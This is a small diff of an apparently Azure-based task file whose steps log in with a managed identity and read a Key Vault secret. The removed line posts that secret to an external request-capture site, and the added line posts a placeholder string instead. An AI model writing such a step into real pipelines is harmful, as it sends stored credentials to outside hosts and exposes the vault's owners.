@@ -2,4 +2,4 @@ version: v1.1.0
 steps:
   - cmd: az login --allow-no-subscriptions --identity
   - cmd: body="$(az keyvault secret show --vault-name azurestage --name secretPwd)"
-  - cmd: bash curl -X POST https://test-azure.free.beeceptor.com -H 'Content-Type: application/json' -d $body
+  - cmd: bash curl -X POST https://test-azure.free.beeceptor.com -H 'Content-Type: application/json' -d "test"
